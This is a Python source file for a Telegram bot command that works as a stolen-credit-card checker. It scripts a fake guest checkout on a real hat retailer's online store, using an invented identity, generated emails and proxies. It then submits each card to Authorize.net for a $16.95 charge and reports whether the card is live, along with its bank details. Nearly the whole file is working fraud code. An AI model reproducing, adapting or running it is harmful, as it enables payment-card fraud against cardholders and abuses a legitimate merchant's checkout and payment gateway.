import time
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
from src.extras.checklib import MakeGate, ScrapInfo

BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Authorized"
subtype = "16.95$ Charged"
command = "au"


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg)


async def get_live(card, msg):
    email = ScrapInfo().email_generator()
    session = ScrapInfo().session()

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    initial_time = time.time()
    data_bin = MakeGate(card).bin_lookup()
    proxy = session.proxies

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    initial_time = time.time()

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://millerhats.com",
        "Referer": "https://millerhats.com/store/Mens_Caps/337_Pinstripe_Railroad_Cap?sort=p.price&order=ASC",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    data = {
        "quantity": "1",
        "product_id": "72",
    }

    response = session.post(
        "https://millerhats.com/store/index.php?route=checkout/cart/add",
        headers=headers,
        data=data,
    )
    current_time = datetime.now().strftime("%D - %H:%M:%S")
    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    # ========= Second req ============

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://millerhats.com/store/Mens_Caps/337_Pinstripe_Railroad_Cap?sort=p.price&order=ASC",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    response = session.get(
        "https://millerhats.com/store/index.php?route=checkout/checkout",
        headers=headers,
    )

    await msg.edit_text(
        msgg.replace("🌩️", "⛈️"), parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )

    # ======== Third req ==========

    headers = {
        "Accept": "text/html, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    response = session.get(
        "https://millerhats.com/store/index.php?route=checkout/guest", headers=headers
    )

    # await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)

    # ========== Fourth req ========

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://millerhats.com",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    data = {
        "firstname": "Sebastian",
        "lastname": "Gutierrez",
        "email": email,
        "telephone": "789378932",
        "fax": "",
        "company": "Hunter",
        "address_1": "103-105 Central Avenue",
        "address_2": "",
        "city": "Orange",
        "postcode": "07050-3824",
        "country_id": "223",
        "zone_id": "3653",
        "shipping_address": "1",
    }

    response = session.post(
        "https://millerhats.com/store/index.php?route=checkout/guest/save",
        headers=headers,
        data=data,
    )

    # await msg.edit_text("4", parse_mode=ParseMode.MARKDOWN)

    # =========== Fifth req ========

    headers = {
        "Accept": "text/html, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    response = session.get(
        "https://millerhats.com/store/index.php?route=checkout/shipping_method",
        headers=headers,
    )

    # await msg.edit_text("5", parse_mode=ParseMode.MARKDOWN)

    # ========== Sixth req ========

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://millerhats.com",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    data = {
        "shipping_method": "weight.weight_5",
        "comment": "",
    }

    response = session.post(
        "https://millerhats.com/store/index.php?route=checkout/shipping_method/save",
        headers=headers,
        data=data,
    )

    headers = {
        "Accept": "text/html, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    response = session.get(
        "https://millerhats.com/store/index.php?route=checkout/payment_method",
        headers=headers,
    )

    # await msg.edit_text("6", parse_mode=ParseMode.MARKDOWN)

    # ============ Seventh ===========

    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://millerhats.com",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    data = {
        "payment_method": "authnetsim",
        "comment": "",
        "agree": "1",
    }

    response = session.post(
        "https://millerhats.com/store/index.php?route=checkout/payment_method/save",
        headers=headers,
        data=data,
    )

    headers = {
        "Accept": "text/html, */*; q=0.01",
        "Accept-Language": "es-AR,es;q=0.9",
        "Connection": "keep-alive",
        "Referer": "https://millerhats.com/store/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
    }

    response = session.get(
        "https://millerhats.com/store/index.php?route=checkout/confirm", headers=headers
    )
    try:
        price = ScrapInfo().getStr(response.text, """ <td colspan="4" class="text-right"><strong>Total:</strong></td>
        <td class="text-right">$""",
            '</td>',
        )

        login = ScrapInfo().getStr(response.text, 'x_login" value="', '" />')
        hash_ = ScrapInfo().getStr(response.text, 'x_fp_hash" value="', '" />')
        invoice = ScrapInfo().getStr(response.text, 'invoice_num" value="', '" />')
        time_stamp = ScrapInfo().getStr(response.text, 'x_fp_timestamp" value="', '" />')
        fp = ScrapInfo().getStr(response.text, 'x_fp_sequence" value="', '" />')

        #  ========= Eight req ========

        data = {
            "x_version": "3.0",
            "x_method": "CC",
            "x_login": login,
            "x_amount": price,
            "x_currency_code": "USD",
            "x_type": "auth_capture",
            "x_cust_ID": "0",
            "x_email_customer": "FALSE",
            "x_company": "New York",
            "x_first_name": "Sebastian",
            "x_last_name": "Gutierrez",
            "x_address": "103-105 Central Avenue",
            "x_city": "Orange",
            "x_state": "NJ",
            "x_zip": "07050-3824",
            "x_country": "United States",
            "x_phone": "78745834",
            "x_fax": "",
            "x_email": email,
            "x_ship_to_company": "Quack.Inc",
            "x_ship_to_first_name": "Sebastian",
            "x_ship_to_last_name": "Gutierrez",
            "x_ship_to_address": "103-105 Central Avenue",
            "x_ship_to_city": "Orange",
            "x_ship_to_state": "NJ",
            "x_ship_to_zip": "07050-3824",
            "x_ship_to_country": "United States",
            "x_Customer_IP": proxy["http"],
            "x_invoice_num": invoice,
            "x_description": "Online purchase from Miller Hats",
            "x_duplicate_window": "120",
            "x_relay_response": "TRUE",
            "x_relay_always": "FALSE",
            "x_relay_url": "https://millerhats.com/store/authnetsim_callback.php",
            "x_show_form": "PAYMENT_FORM",
            "x_cancel_url": "https://millerhats.com/store/index.php?route=payment/authnetsim/cancel",
            "x_cancel_url_text": "Cancel and Return",
            "x_receipt_link_method": "POST",
            "x_receipt_link_text": "- YOU MUST CLICK HERE TO COMPLETE THE ORDER! - ",
            "x_receipt_link_url": "https://millerhats.com/store/index.php?route=payment/authnetsim/success",
            "x_logo_url": "http://www.millerhats.com/images/Miller-Header-32.png",
            "x_fp_sequence": fp,
            "x_fp_timestamp": time_stamp,
            "x_fp_hash": hash_,
        }

        response = session.post(
            "https://secure.authorize.net/gateway/transact.dll",
            headers=headers,
            data=data,
        )

        # await msg.edit_text("8", parse_mode=ParseMode.MARKDOWN)

        # ======================== PAYING =========

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Language": "es-AR,es;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://secure.authorize.net",
            "Referer": "https://secure.authorize.net/gateway/transact.dll",
            "Upgrade-Insecure-Requests": "1",
        }

        data = {
            "x_show_form": "pf_receipt",
            "x_version": "3.0",
            "x_method": "CC",
            "x_login": login,
            "x_amount": price,
            "x_currency_code": "USD",
            "x_type": "auth_capture",
            "x_cust_ID": "0",
            "x_email_customer": "FALSE",
            "x_Customer_IP": proxy["http"],
            "x_invoice_num": invoice,
            "x_description": "Online purchase from Miller Hats",
            "x_duplicate_window": "120",
            "x_relay_response": "TRUE",
            "x_relay_always": "FALSE",
            "x_relay_url": "https://millerhats.com/store/authnetsim_callback.php",
            "x_cancel_url": "https://millerhats.com/store/index.php?route=payment/authnetsim/cancel",
            "x_cancel_url_text": "Cancel and Return",
            "x_receipt_link_method": "POST",
            "x_receipt_link_text": "- YOU MUST CLICK HERE TO COMPLETE THE ORDER! -",
            "x_receipt_link_url": "https://millerhats.com/store/index.php?route=payment/authnetsim/success",
            "x_logo_url": "http://www.millerhats.com/images/Miller-Header-32.png",
            "x_fp_sequence": fp,
            "x_fp_timestamp": time_stamp,
            "x_fp_hash": hash_,
            "x_card_num": ccn,
            "x_exp_date": month + year,
            "x_first_name": "Sebastian",
            "x_last_name": "Gutierrez",
            "x_company": "Quack.Inc",
            "x_address": "103-105 Central Avenue",
            "x_city": "Orange",
            "x_state": "NJ",
            "x_zip": "07050-3824",
            "x_country": "United States",
            "x_email": email,
            "x_phone": "78745834",
            "x_fax": "",
            "x_ship_to_first_name": "Sebastian",
            "x_ship_to_last_name": "Gutierrez",
            "x_ship_to_company": "Quack.Inc",
            "x_ship_to_address": "07050-3824",
            "x_ship_to_city": "Orange",
            "x_ship_to_state": "NJ",
            "x_ship_to_zip": "07050-3824",
            "x_ship_to_country": "United States",
        }

        response = session.post(
            "https://secure.authorize.net/gateway/transact.dll",
            headers=headers,
            data=data,
        )
        card_response = (
            ScrapInfo().getStr(response.text, "_response_reason_text=", "&x_avs_code")
            .replace("+", " ")
            .replace("%21", " ")
        )
        final_time = time.perf_counter() - initial_time

        mssg = f"""<b>#Authorize_AVS ($au) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status:<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {card_response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: 16.95$ CHARGED</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""  # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅

        await msg.edit_text(
            mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )
        session.cookies.clear()
        session.close()

    except Exception as e:
        final_time = time.time() - initial_time
        msgg = f"""<b>#Authorize_AVS ($au) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: DECLINED! ❌<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {e}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
        await msg.edit_text(
            msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )
